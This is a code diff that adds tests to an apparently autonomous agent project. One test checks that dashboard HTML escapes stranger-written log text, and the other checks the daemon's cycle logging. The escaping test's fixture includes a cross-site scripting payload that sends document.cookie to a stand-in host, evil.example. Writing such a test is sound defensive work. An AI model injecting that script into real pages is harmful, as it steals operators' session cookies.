@@ -381,6 +381,59 @@ describe('FLOP Scout Technocore Integration & Autonomous Engine', () => {
     assert.equal(saved.did, identity.did);
   });
 
+  test('dashboard escapes stranger-written text instead of executing it', async () => {
+    const { generateDashboardHtml, escapeHtml } = await import('../src/dashboard.mjs');
+
+    assert.equal(escapeHtml('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;');
+    assert.equal(escapeHtml('a & b'), 'a &amp; b');
+
+    const html = generateDashboardHtml({
+      identity: { did: 'did:key:z6MkTestDid' },
+      heartbeat: { status: 'active', turns: 1 },
+      logs: [{
+        timestamp: new Date().toISOString(),
+        action: 'answered_inquiry',
+        details: {
+          targetAgent: 'did:key:z6MkAttacker',
+          reason: 'test',
+          // Anyone can post this into /r/lobby; the operator then opens the page.
+          inquiry: '<script>fetch("https://evil.example/"+document.cookie)</script>',
+          response: 'GET /r/<room>?since=<seq>&wait=10'
+        }
+      }]
+    });
+
+    assert.equal(html.includes('<script>fetch('), false, 'inline script must not survive into the page');
+    assert.equal(html.includes('&lt;script&gt;fetch('), true);
+
+    // The same bug silently ate the placeholders out of the agent's own answers.
+    assert.equal(html.includes('GET /r/&lt;room&gt;?since=&lt;seq&gt;&amp;wait=10'), true);
+  });
+
+  test('a scheduled tick logs cycle_complete, not shutdown', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-cycle-'));
+    const auditLogPath = path.join(tmpDir, 'audit.jsonl');
+    const { runScoutDaemon } = await import('../src/daemon.mjs');
+
+    await runScoutDaemon({
+      dryRun: true,
+      identityPath: path.join(tmpDir, 'identity.json'),
+      scribeIdentityPath: path.join(tmpDir, 'scribe.json'),
+      auditLogPath,
+      serverUrl,
+      room: 'noise',
+      watchRooms: [],
+      docsDir: tmpDir
+    });
+
+    const events = fs.readFileSync(auditLogPath, 'utf8').split('\n').filter(Boolean)
+      .map((l) => JSON.parse(l).event).filter(Boolean);
+    assert.equal(events.includes('cycle_complete'), true);
+    assert.equal(events.includes('shutdown'), false, 'a normal tick must not look like a crash');
+
+    fs.rmSync(tmpDir, { recursive: true, force: true });
+  });
+
   test('state survives a restart despite the server untrusted-content banner', async () => {
     const { stripUntrustedBanner } = await import('../src/technocore-client.mjs');
     assert.equal(
